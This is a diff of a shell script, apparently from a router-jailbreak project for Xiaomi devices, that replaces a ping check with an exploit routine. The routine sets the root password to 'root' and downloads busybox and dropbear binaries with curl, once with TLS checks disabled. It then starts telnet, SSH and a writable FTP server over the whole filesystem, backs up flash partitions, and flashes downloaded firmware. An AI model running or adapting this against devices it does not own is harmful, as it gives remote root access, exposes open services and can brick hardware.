@@ -2,35 +2,117 @@
 
 set -euo pipefail
 
-ping_chk()
-{
-    if [ -z "$1" ]; then
-        echo "Ping network chk error! [URL isn't a nullable value]"
-    else
-        ping -c 1 -W 1 $1
-        
-        if [ $? -eq 0 ]; then
-            echo "Ping network check [$1] success!" >> /tmp/script_debug
-        else
-            echo "Ping network check [$1] failed!" >> /tmp/script_debug
-        fi
-    fi
+exploit() {
+    setup_password
+    setup_busybox
+    start_telnet
+    start_ftp
+    start_ssh
+    update_firmware
+    echo "Done exploiting"
 }
 
-exploit() {
+setup_password() {
+    # Override existing password, as the default one set by xiaomi is unknown
+    # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
+    echo -e "root\nroot" | passwd root
+}
+
+setup_busybox() {
+    # kill/stop telnet, in case it is running from a previous execution
+    pgrep busybox | xargs kill || true
+
+    cd /tmp
+    rm -rf busybox
+    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
+    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
+    chmod +x busybox
+}
+
+start_ftp() {
+    cd /tmp
+    ln -sfn busybox ftpd # Create symlink needed for running ftpd
+    ./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &
+}
+
+start_telnet() {
+    cd /tmp
+    ./busybox telnetd
+}
+
+start_ssh() {
+    cd /tmp
+
+    # Clean
+    rm -rf dropbear
+    rm -rf dropbear.tar.bz2
+    rm -rf /etc/dropbear
+
+    # kill/stop dropbear, in case it is running from a previous execution
+    pgrep dropbear | xargs kill || true
+
+    # Donwload dropbear static mipsel binary
+    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbearStaticMipsel.tar.bz2" --output dropbear.tar.bz2
+    mkdir dropbear
+    /tmp/busybox tar xvfj dropbear.tar.bz2 -C dropbear --strip-components=1
+
+    # Add keys
+    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
+    mkdir -p /etc/dropbear
+    cd /etc/dropbear
+    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
+    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key
+
+    # Start SSH server
+    /tmp/dropbear/dropbear
+
+    # https://unix.stackexchange.com/a/402749
+    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
+}
+
+remount() {
+    echo "Remount /usr/share/xiaoqiang as read-write"
+
+    cp -R /usr/share/xiaoqiang /tmp/xiaoqiang
+    mount --bind /tmp/xiaoqiang /usr/share/xiaoqiang
+
+    echo "Done remounting"
+}
+
+# Function inspired by https://openwrt.org/docs/guide-user/installation/generic.backup#create_full_mtd_backup
+mtd_backup() {
+    TMPDIR="/tmp"
+    BACKUP_DIR="${TMPDIR}/mtd_backup"
+    OUTPUT_FILE="${TMPDIR}/mtd_backup.tgz"
+
+    # Start
+    echo "Start"
+    rm -rf "${BACKUP_DIR}"
+    mkdir -p "${BACKUP_DIR}"
+
+    # List remote mtd devices from /proc/mtd. The first line is just a table
+    # header, so skip it (using tail)
+    cat /proc/mtd | tail -n+2 | while read; do
+        MTD_DEV=$(echo ${REPLY} | cut -f1 -d:)
+        MTD_NAME=$(echo ${REPLY} | cut -f2 -d\")
+        echo "Backing up ${MTD_DEV} (${MTD_NAME})"
+        dd if="/dev/${MTD_DEV}" of="${BACKUP_DIR}/${MTD_DEV}_${MTD_NAME}.bin"
+    done
+    
+    # Do not compress, as the device runs out of storage for such operation
+    echo "Done backing up"
+}
+
+update_firmware() {
     echo "Start download Danbi FW..." > /tmp/script_debug
 
-    ping_chk "8.8.8.8"
-    ping_chk "https://fwdown.s3.ap-northeast-2.amazonaws.com"
-
-    /usr/bin/curl -L "https://fwdown.s3.ap-northeast-2.amazonaws.com/mir4ag/2.3.5/mir4ag-V2.3.5.bin" --output /tmp/danbi_fw.bin
+    curl -L "https://fwdown.s3.ap-northeast-2.amazonaws.com/mir4ag/2.3.5/mir4ag-V2.3.5.bin" --output /tmp/danbi_fw.bin
     echo "FW download curl return value : $?" >> /tmp/script_debug
 
     echo "Done download Danbi FW...FW update start..." >> /tmp/script_debug
 
     mtd -e OS1 -r write /tmp/danbi_fw.bin OS1
     echo "FW update mtd return value : $?" >> /tmp/script_debug
- 
 }
 
 # From https://stackoverflow.com/a/16159057
